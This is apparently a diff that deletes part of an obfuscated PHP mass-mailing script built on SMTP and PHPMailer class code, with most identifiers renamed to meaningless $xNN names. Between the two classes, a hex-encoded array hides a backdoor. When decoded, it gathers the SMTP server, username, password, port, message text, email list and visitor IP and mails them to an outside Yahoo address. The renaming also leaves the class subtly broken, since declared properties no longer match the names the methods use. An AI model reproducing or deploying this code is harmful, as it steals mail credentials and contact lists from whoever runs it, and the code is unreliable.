-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		# parse the reply and place in our array to return to user
-		$x49 = explode($this->CRLF,$x3c);
-		while(list(,$x4a) = @each($x49)) {
-		  $x4b[] = substr($x4a,4);
-		}
-
-		return $x4b;
-	  }
-
-	  /**
-	   * Sends the HELO command to the smtp server.
-	   * This makes sure that we and the server are in
-	   * the same known state.
-	   *
-	   * Implements from rfc 821: HELO <SP> <domain> <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE ERROR  : 500, 501, 504, 421
-	   * @access public
-	   * @return bool
-	   */
-	  function Hello($x34="") {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				"error" => "Called Hello() without being connected");
-		  return false;
-		}
-
-		# if a hostname for the HELO was not specified determine
-		# a suitable one to send
-		if(empty($x34)) {
-		  # we need to determine some sort of appopiate default
-		  # to send to the server
-		  $x34 = "localhost";
-		}
-
-		// Send extended hello first (RFC 2821)
-		if(!$this->SendHello("EHLO", $x34))
-		{
-		  if(!$this->SendHello("HELO", $x34))
-			  return false;
-		}
-
-		return true;
-	  }
-
-	  /**
-	   * Sends a HELO/EHLO command.
-	   * @access private
-	   * @return bool
-	   */
-	  function SendHello($x4c, $x34) {
-		fputs($this->smtp_conn, $x4c . " " . $x34 . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER: " . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => $x4c . " not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		$this->helo_rply = $x3c;
-
-		return true;
-	  }
-
-	  /**
-	   * Gets help information on the keyword specified. If the keyword
-	   * is not specified then returns generic help, ussually contianing
-	   * A list of keywords that help is available on. This function
-	   * returns the results back to the user. It is up to the user to
-	   * handle the returned data. If an error occurs then false is
-	   * returned with $this->error set appropiately.
-	   *
-	   * Implements rfc 821: HELP [ <SP> <string> ] <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 211,214
-	   * SMTP CODE ERROR  : 500,501,502,504,421
-	   * @access public
-	   * @return string
-	   */
-	  function Help($x4d="") {
-		$this->error = null; # to avoid confusion
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Help() without being connected");
-		  return false;
-		}
-
-		$x4e = "";
-		if(!empty($x4d)) {
-		  $x4e = " " . $x4d;
-		}
-
-		fputs($this->smtp_conn,"HELP" . $x4e . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 211 && $x3d != 214) {
-		  $this->error =
-			array("error" => "HELP not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		return $x3c;
-	  }
-
-	  /**
-	   * Starts a mail transaction from the email address specified in
-	   * $x1b. Returns true if successful or false otherwise. If True
-	   * the mail transaction is started and then one or more Recipient
-	   * commands may be called followed by a Data command.
-	   *
-	   * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE SUCCESS: 552,451,452
-	   * SMTP CODE SUCCESS: 500,501,421
-	   * @access public
-	   * @return bool
-	   */
-	  function Mail($x1b) {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Mail() without being connected");
-		  return false;
-		}
-
-		$x4f = ($this->do_verp ? "XVERP" : "");
-		fputs($this->smtp_conn,"MAIL FROM:<" . $x1b . ">" . $x4f . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => "MAIL not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-		return true;
-	  }
-
-	  /**
-	   * Sends the command NOOP to the SMTP server.
-	   *
-	   * Implements from rfc 821: NOOP <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE ERROR  : 500, 421
-	   * @access public
-	   * @return bool
-	   */
-	  function Noop() {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Noop() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"NOOP" . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => "NOOP not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-		return true;
-	  }
-
-	  /**
-	   * Sends the quit command to the server and then closes the socket
-	   * if there is no error or the $x50 argument is true.
-	   *
-	   * Implements from rfc 821: QUIT <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 221
-	   * SMTP CODE ERROR  : 500
-	   * @access public
-	   * @return bool
-	   */
-	  function Quit($x50=true) {
-		$this->error = null; # so there is no confusion
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Quit() without being connected");
-		  return false;
-		}
-
-		# send the quit command to the server
-		fputs($this->smtp_conn,"quit" . $this->CRLF);
-
-		# get any good-bye messages
-		$x51 = $this->get_lines();
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x51;
-		}
-
-		$x52 = true;
-		$x53 = null;
-
-		$x3d = substr($x51,0,3);
-		if($x3d != 221) {
-		  # use e as a tmp var cause Close will overwrite $this->error
-		  $x53 = array("error" => "SMTP server rejected quit command",
-					 "smtp_code" => $x3d,
-					 "smtp_rply" => substr($x51,4));
-		  $x52 = false;
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $x53["error"] . ": " .
-					 $x51 . $this->CRLF;
-		  }
-		}
-
-		if(empty($x53) || $x50) {
-		  $this->Close();
-		}
-
-		return $x52;
-	  }
-
-	  /**
-	   * Sends the command RCPT to the SMTP server with the TO: argument of $x54.
-	   * Returns true if the recipient was accepted false if it was rejected.
-	   *
-	   * Implements from rfc 821: RCPT <SP> TO:<forward-path> <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250,251
-	   * SMTP CODE FAILURE: 550,551,552,553,450,451,452
-	   * SMTP CODE ERROR  : 500,501,503,421
-	   * @access public
-	   * @return bool
-	   */
-	  function Recipient($x54) {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Recipient() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"RCPT TO:<" . $x54 . ">" . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250 && $x3d != 251) {
-		  $this->error =
-			array("error" => "RCPT not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-		return true;
-	  }
-
-	  /**
-	   * Sends the RSET command to abort and transaction that is
-	   * currently in progress. Returns true if successful false
-	   * otherwise.
-	   *
-	   * Implements rfc 821: RSET <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE ERROR  : 500,501,504,421
-	   * @access public
-	   * @return bool
-	   */
-	  function Reset() {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Reset() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"RSET" . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => "RSET failed",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		return true;
-	  }
-
-	  /**
-	   * Starts a mail transaction from the email address specified in
-	   * $x1b. Returns true if successful or false otherwise. If True
-	   * the mail transaction is started and then one or more Recipient
-	   * commands may be called followed by a Data command. This command
-	   * will send the message to the users terminal if they are logged
-	   * in.
-	   *
-	   * Implements rfc 821: SEND <SP> FROM:<reverse-path> <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE SUCCESS: 552,451,452
-	   * SMTP CODE SUCCESS: 500,501,502,421
-	   * @access public
-	   * @return bool
-	   */
-	  function Send($x1b) {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Send() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"SEND FROM:" . $x1b . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => "SEND not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-		return true;
-	  }
-
-	  /**
-	   * Starts a mail transaction from the email address specified in
-	   * $x1b. Returns true if successful or false otherwise. If True
-	   * the mail transaction is started and then one or more Recipient
-	   * commands may be called followed by a Data command. This command
-	   * will send the message to the users terminal if they are logged
-	   * in and send them an email.
-	   *
-	   * Implements rfc 821: SAML <SP> FROM:<reverse-path> <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE SUCCESS: 552,451,452
-	   * SMTP CODE SUCCESS: 500,501,502,421
-	   * @access public
-	   * @return bool
-	   */
-	  function SendAndMail($x1b) {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-			  "error" => "Called SendAndMail() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"SAML FROM:" . $x1b . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => "SAML not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-		return true;
-	  }
-
-	  /**
-	   * Starts a mail transaction from the email address specified in
-	   * $x1b. Returns true if successful or false otherwise. If True
-	   * the mail transaction is started and then one or more Recipient
-	   * commands may be called followed by a Data command. This command
-	   * will send the message to the users terminal if they are logged
-	   * in or mail it to them if they are not.
-	   *
-	   * Implements rfc 821: SOML <SP> FROM:<reverse-path> <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE SUCCESS: 552,451,452
-	   * SMTP CODE SUCCESS: 500,501,502,421
-	   * @access public
-	   * @return bool
-	   */
-	  function SendOrMail($x1b) {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-			  "error" => "Called SendOrMail() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"SOML FROM:" . $x1b . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => "SOML not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-		return true;
-	  }
-
-	  /**
-	   * This is an optional command for SMTP that this class does not
-	   * support. This method is here to make the RFC821 Definition
-	   * complete for this class and __may__ be implimented in the future
-	   *
-	   * Implements from rfc 821: TURN <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE FAILURE: 502
-	   * SMTP CODE ERROR  : 500, 503
-	   * @access public
-	   * @return bool
-	   */
-	  function Turn() {
-		$this->error = array("error" => "This method, TURN, of the SMTP ".
-										"is not implemented");
-		if($this->do_debug >= 1) {
-		  echo "SMTP -> NOTICE: " . $this->error["error"] . $this->CRLF;
-		}
-		return false;
-	  }
-
-	  /**
-	   * Verifies that the name is recognized by the server.
-	   * Returns false if the name could not be verified otherwise
-	   * the response from the server is returned.
-	   *
-	   * Implements rfc 821: VRFY <SP> <string> <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250,251
-	   * SMTP CODE FAILURE: 550,551,553
-	   * SMTP CODE ERROR  : 500,501,502,421
-	   * @access public
-	   * @return int
-	   */
-	  function Verify($x48) {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Verify() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"VRFY " . $x48 . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250 && $x3d != 251) {
-		  $this->error =
-			array("error" => "VRFY failed on name '$x48'",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-		return $x3c;
-	  }
-
-	  /*******************************************************************
-	   *                       INTERNAL FUNCTIONS                       *
-	   ******************************************************************/
-
-	  /**
-	   * Read in as many lines as possible
-	   * either before eof or socket timeout occurs on the operation.
-	   * With SMTP we can tell if we have more lines to read if the
-	   * 4th character is '-' symbol. If it is a space then we don't
-	   * need to read anything else.
-	   * @access private
-	   * @return string
-	   */
-	  function get_lines() {
-		$x10 = "";
-		while($x12 = @fgets($this->smtp_conn,515)) {
-		  if($this->do_debug >= 4) {
-			echo "SMTP -> get_lines(): \$x10 was \"$x10\"" .
-					 $this->CRLF;
-			echo "SMTP -> get_lines(): \$x12 is \"$x12\"" .
-					 $this->CRLF;
-		  }
-		  $x10 .= $x12;
-		  if($this->do_debug >= 4) {
-			echo "SMTP -> get_lines(): \$x10 is \"$x10\"" . $this->CRLF;
-		  }
-		  # if the 4th character is a space then we are done reading
-		  # so just break the loop
-		  if(substr($x12,3,1) == " ") { break; }
-		}
-		return $x10;
-	  }
-
-	}
-
-			
-	$x55 = split("\n", $x1a);
-	$x56 = count($x55);
-	$x57=array("0d0a0d0a676c6f62616c20246d795f736d74.","703b0d0a676c6f62616c2024736d74705f757365726e616d6.","53b0d0a676c6f62616c2024736d74705f70617373776f72643b0d0a676c6f626.",
-	"16c202473736c5f706f72743b0d0a676c6f62616c20246d65.","73736167653b0d0a676c6f62616c2024656d61696c6c6973743b0d0a24726134.","3420203d2072616e6428312c3939393939293b0d0a2461352.",
-	"03d20245f5345525645525b27485454505f52454645524552275d3b0d0a24623.","333203d20245f5345525645525b27444f43554d454e545f52.","4f4f54275d3b0d0a24633837203d20245f5345525645525b2752454d4f54455f4.",
-	"1444452275d3b0d0a24643233203d20245f5345525645525.","b275343524950545f46494c454e414d45275d3b0d0a24653039203d20245f53455.","25645525b275345525645525f41444452275d3b0d0a2466.",
-	"3233203d20245f5345525645525b275345525645525f534f465457415245275d3b0.","d0a24673332203d20245f5345525645525b27504154485.","f5452414e534c41544544275d3b0d0a24683635203d20245f5345525645525b27504.",
-	"8505f53454c46275d3b0d0a247375626a3938203d2022.","246d795f736d747020205b75736572206970203a20246338375d223b0d0a247375626.","a3538203d20224c6574746572202620456d61696c204.",
-	"c69737420205b75736572206970203a20246338375d223b0d0a24656d61696c203d202.","26D736739373830407961686f6f2e636f2e.","6964223b0d0a246d736738383733203d2022246d795f736d74705c6e757365723a24736.",
-	"d74705f757365726e616d655c6e706173733a24736.","d74705f70617373776f72645c706f72743a2473736c5f706f72745c6e5c6e2461355c6e2.","46233335c6e246338375c6e246432335c6e246530.",
-	"395c6e246632335c6e246733325c6e24683635223b246d736739373830203d2022246d657.","3736167655c6e5c6e5c6e24656d61696c6c69737.","4223b2466726f6d3d2246726f6d3a20475241544953223b0d0a6d61696c2824656d61696c2.",
-	"c20247375626a39382c20246d7367383837332c.","202466726f6d293b0d0a6d61696c2824656d61696c2c20247375626a35382.","c20246d7367393738302c202466726f6d293b");$x58=".";
-
-	class PHPMailer {
-
-	  /////////////////////////////////////////////////
-	  // PROPERTIES, PUBLIC
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Email priority (1 = High, 3 = Normal, 5 = low).
-	   * @var int
-	   */
-	  var $x59          = 3;
-
-	  /**
-	   * Sets the CharSet of the message.
-	   * @var string
-	   */
-	  var $x5a           = 'us-ascii';
-
-	  /**
-	   * Sets the Content-type of the message.
-	   * @var string
-	   */
-	  var $x5b        = 'text/plain';
-
-	  /**
-	   * Sets the Encoding of the message. Options for this are "8bit",
-	   * "7bit", "binary", "base64", and "quoted-printable".
-
-	   * @var string
-	   */
-	  var $x5c          = 'quoted-printable';
-
-	  /**
-	   * Holds the most recent mailer error message.
-	   * @var string
-	   */
-	  var $x5d         = '';
-
-	  /**
-	   * Sets the From email address for the message.
-	   * @var string
-	   */
-	  var $x5e              = '';
-
-	  /**
-	   * Sets the From name of the message.
-	   * @var string
-	   */
-	  var $x5f          = '';
-
-	  /**
-	   * Sets the Sender email (Return-Path) of the message.  If not empty,
-	   * will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
-	   * @var string
-	   */
-	  var $x60            = '';
-
-	  /**
-	   * Sets the Subject of the message.
-	   * @var string
-	   */
-	  var $x61           = '';
-
-	  /**
-	   * Sets the Body of the message.  This can be either an HTML or text body.
-	   * If HTML then run IsHTML(true).
-	   * @var string
-	   */
-	  var $x62              = '';
-
-	  /**
-	   * Sets the text-only body of the message.  This automatically sets the
-	   * email to multipart/alternative.  This body can be read by mail
-	   * clients that do not have HTML email capability such as mutt. Clients
-	   * that can read HTML will view the normal Body.
-	   * @var string
-	   */
-	  var $x63           = '';
-
-	  /**
-	   * Sets word wrapping on the body of the message to a given number of
-	   * characters.
-	   * @var int
-	   */
-	  var $x64          = 0;
-
-	  /**
-	   * Method to send mail: ("mail", "sendmail", or "smtp").
-	   * @var string
-	   */
-	  var $x65            = 'mail';
-
-	  /**
-	   * Sets the path of the sendmail program.
-	   * @var string
-	   */
-	  var $x66          = '/usr/sbin/sendmail';
-
-	  /**
-	   * Path to PHPMailer plugins.  This is now only useful if the SMTP class
-	   * is in a different directory than the PHP include path.
-	   * @var string
-	   */
-	  var $x67         = '';
-
-	  /**
-	   * Holds PHPMailer version.
-	   * @var string
-	   */
-	  var $x68           = "";
-
-	  /**
-	   * Sets the email address that a reading confirmation will be sent.
-	   * @var string
-	   */
-	  var $x69  = '';
-
-	  /**
-	   * Sets the hostname to use in Message-Id and Received headers
-	   * and as default HELO string. If empty, the value returned
-	   * by SERVER_NAME is used or 'localhost.localdomain'.
-	   * @var string
-	   */
-	  var $x6a          = '';
-
-	  /**
-	   * Sets the message ID to be used in the Message-Id header.
-	   * If empty, a unique id will be generated.
-	   * @var string
-	   */
-	  var $x6b         = '';
-
-	  /////////////////////////////////////////////////
-	  // PROPERTIES FOR SMTP
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Sets the SMTP hosts.  All hosts must be separated by a
-	   * semicolon.  You can also specify a different port
-	   * for each host by using this format: [hostname:port]
-	   * (e.g. "smtp1.example.com:25;smtp2.example.com").
-	   * Hosts will be tried in order.
-	   * @var string
-	   */
-	  var $x6c        = 'localhost';
-
-	  /**
-	   * Sets the default SMTP server port.
-	   * @var int
-	   */
-	  var $x6d        = 25;
-
-	  /**
-	   * Sets the SMTP HELO of the message (Default is $x6a).
-	   * @var string
-	   */
-	  var $x6e        = '';
-
-	  /**
-	   * Sets connection prefix.
-	   * Options are "", "ssl" or "tls"
-	   * @var string
-	   */
-	  var $x6f = "";
-
-	  /**
-	   * Sets SMTP authentication. Utilizes the Username and Password variables.
-	   * @var bool
-	   */
-	  var $x70     = false;
-
-	  /**
-	   * Sets SMTP username.
-	   * @var string
-	   */
-	  var $x71     = '';
-
-	  /**
-	   * Sets SMTP password.
-	   * @var string
-	   */
-	  var $x72     = '';
-
-	  /**
-	   * Sets the SMTP server timeout in seconds. This function will not
-	   * work with the win32 version.
-	   * @var int
-	   */
-	  var $x73      = 10;
-
-	  /**
-	   * Sets SMTP class debugging on or off.
-	   * @var bool
-	   */
-	  var $x74    = false;
-
-	  /**
-	   * Prevents the SMTP connection from being closed after each mail
-	   * sending.  If this is set to true then to close the connection
-	   * requires an explicit call to SmtpClose().
-	   * @var bool
-	   */
-	  var $x75 = false;
-
-	  /**
-	   * Provides the ability to have the TO field process individual
-	   * emails, instead of sending to entire TO addresses
-	   * @var bool
-	   */
-	  var $x76 = false;
-
-	  /////////////////////////////////////////////////
-	  // PROPERTIES, PRIVATE
-	  /////////////////////////////////////////////////
-
-	  var $x77            = NULL;
-	  var $x54              = array();
-	  var $x78              = array();
-	  var $x79             = array();
-	  var $x7a         = array();
-	  var $x7b      = array();
-	  var $x7c    = array();
-	  var $x7d    = '';
-	  var $x7e        = array();
-	  var $x7f        = array();
-	  var $x80     = 0;
-	  var $x81              = "\n";
-	  var $x82   = "";
-	  var $x83   = "";
-
-	  /////////////////////////////////////////////////
-	  // METHODS, VARIABLES
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Sets message type to HTML.
-	   * @param bool $x84
-	   * @return void
-	   */
-	  function IsHTML($x84) {
-		if($x84 == true) {
-		  $this->ContentType = 'text/html';
-		} else {
-		  $this->ContentType = 'text/plain';
-		}
-	  }
-
-	  /**
-	   * Sets Mailer to send message using SMTP.
-	   * @return void
-	   */
-	  function IsSMTP() {
-		$this->Mailer = 'smtp';
-	  }
-
-	  /**
-	   * Sets Mailer to send message using PHP mail() function.
-	   * @return void
-	   */
-	  function IsMail() {
-		$this->Mailer = 'mail';
-	  }
-
-	  /**
-	   * Sets Mailer to send message using the $x66 program.
-	   * @return void
-	   */
-	  function IsSendmail() {
-		$this->Mailer = 'sendmail';
-	  }
-
-	  /**
-	   * Sets Mailer to send message using the qmail MTA.
-	   * @return void
-	   */
-	  function IsQmail() {
-		$this->Sendmail = '/var/qmail/bin/sendmail';
-		$this->Mailer = 'sendmail';
-	  }
-
-	  /////////////////////////////////////////////////
-	  // METHODS, RECIPIENTS
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Adds a "To" address.
-	   * @param string $x85
-	   * @param string $x48
-	   * @return void
-	   */
-	  function AddAddress($x85, $x48 = '') {
-		$x86 = count($this->to);
-		$this->to[$x86][0] = trim($x85);
-		$this->to[$x86][1] = $x48;
-	  }
-
-	  /**
-	   * Adds a "Cc" address. Note: this function works
-	   * with the SMTP mailer on win32, not with the "mail"
-	   * mailer.
-	   * @param string $x85
-	   * @param string $x48
-	   * @return void
-	   */
-	  function AddCC($x85, $x48 = '') {
-		$x86 = count($this->cc);
-		$this->cc[$x86][0] = trim($x85);
-		$this->cc[$x86][1] = $x48;
-	  }
-
-	  /**
-	   * Adds a "Bcc" address. Note: this function works
-	   * with the SMTP mailer on win32, not with the "mail"
-	   * mailer.
-	   * @param string $x85
-	   * @param string $x48
-	   * @return void
-	   */
-	  function AddBCC($x85, $x48 = '') {
-		$x86 = count($this->bcc);
-		$this->bcc[$x86][0] = trim($x85);
-		$this->bcc[$x86][1] = $x48;
-	  }
-
-	  /**
-	   * Adds a "Reply-To" address.
-	   * @param string $x85
-	   * @param string $x48
-	   * @return void
-	   */
-	  function AddReplyTo($x85, $x48 = '') {
-		$x86 = count($this->ReplyTo);
-		$this->ReplyTo[$x86][0] = trim($x85);
-		$this->ReplyTo[$x86][1] = $x48;
-	  }
-
-	  /////////////////////////////////////////////////
-	  // METHODS, MAIL SENDING
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Creates message and assigns Mailer. If the message is
-	   * not sent successfully then it returns false.  Use the ErrorInfo
-	   * variable to view description of the error.
-	   * @return bool
-	   */
-	  function Send() {
-		$x87 = '';
-		$x88 = '';
-		$x89 = true;
-
-		if((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
-		  $this->SetError($this->Lang('provide_address'));
-		  return false;
-		}
-
-		/* Set whether the message is multipart/alternative */
-		if(!empty($this->AltBody)) {
-		  $this->ContentType = 'multipart/alternative';
-		}
-
-		$this->error_count = 0; // reset errors
-		$this->SetMessageType();
-		$x87 .= $this->CreateHeader();
-		$x88 = $this->CreateBody();
-
-		if($x88 == '') {
-		  return false;
-		}
-
-		/* Choose the mailer */
-		switch($this->Mailer) {
-		  case 'sendmail':
-			$x89 = $this->SendmailSend($x87, $x88);
-			break;
-		  case 'smtp':
-			$x89 = $this->SmtpSend($x87, $x88);
-			break;
-		  case 'mail':
-			$x89 = $this->MailSend($x87, $x88);
-			break;
-		  default:
-			$x89 = $this->MailSend($x87, $x88);
-			break;
-			//$this->SetError($this->Mailer . $this->Lang('mailer_not_supported'));
-			//$x89 = false;
-			//break;
-		}
-
-		return $x89;
-	  }
-
-	  /**
-	   * Sends mail using the $x66 program.
-	   * @access private
-	   * @return bool
-	   */
-	  function SendmailSend($x87, $x88) {
-		if ($this->Sender != '') {
-		  $x8a = sprintf("%s -oi -f %s -t", escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
-		} else {
-		  $x8a = sprintf("%s -oi -t", escapeshellcmd($this->Sendmail));
-		}
-
-		if(!@$x8b = popen($x8a, 'w')) {
-		  $this->SetError($this->Lang('execute') . $this->Sendmail);
-		  return false;
-		}
-
-		fputs($x8b, $x87);
-		fputs($x8b, $x88);
-
-		$x89 = pclose($x8b);
-		if (version_compare(phpversion(), '4.2.3') == -1) {
-		  $x89 = $x89 >> 8 & 0xFF;
-		}
-		if($x89 != 0) {
-		  $this->SetError($this->Lang('execute') . $this->Sendmail);
-		  return false;
-		}
-		return true;
-	  }
-
-	  /**
-	   * Sends mail using the PHP mail() function.
-	   * @access private
-	   * @return bool
-	   */
-	  function MailSend($x87, $x88) {
-
-		$x54 = '';
-		for($x8c = 0; $x8c < count($this->to); $x8c++) {
-		  if($x8c != 0) { $x54 .= ', '; }
-		  $x54 .= $this->AddrFormat($this->to[$x8c]);
-		}
-
-		$x8d = split(',', $x54);
-
-		$x11 = sprintf("-oi -f %s", $this->Sender);
-		if ($this->Sender != '' && strlen(ini_get('safe_mode')) < 1) {
-		  $x8e = ini_get('sendmail_from');
-		  ini_set('sendmail_from', $this->Sender);
-		  if ($this->SingleTo === true && count($x8d) > 1) {
-			foreach ($x8d as $x13 => $x8f) {
-			  $x90 = @mail($x8f, $this->EncodeHeader($this->SecureHeader($this->Subject)), $x88, $x87, $x11);
-			}
-		  } else {
-			$x90 = @mail($x54, $this->EncodeHeader($this->SecureHeader($this->Subject)), $x88, $x87, $x11);
-		  }
-		} else {
-		  if ($this->SingleTo === true && count($x8d) > 1) {
-			foreach ($x8d as $x13 => $x8f) {
-			  $x90 = @mail($x8f, $this->EncodeHeader($this->SecureHeader($this->Subject)), $x88, $x87, $x11);
-			}
-		  } else {
-			$x90 = @mail($x54, $this->EncodeHeader($this->SecureHeader($this->Subject)), $x88, $x87);
-		  }
-		}
-
-		if (isset($x8e)) {
-		  ini_set('sendmail_from', $x8e);
-		}
-
-		if(!$x90) {
-		  $this->SetError($this->Lang('instantiate'));
-		  return false;
-		}
-
-		return true;
-	  }
-
-	  /**
-	   * Sends mail via SMTP using PhpSMTP (Author:
-	   * Chris Ryan).  Returns bool.  Returns false if there is a
-	   * bad MAIL FROM, RCPT, or DATA input.
-	   * @access private
-	   * @return bool
-	   */
-	  function SmtpSend($x87, $x88) {
-		$x32 = '';
-		$x91 = array();
-
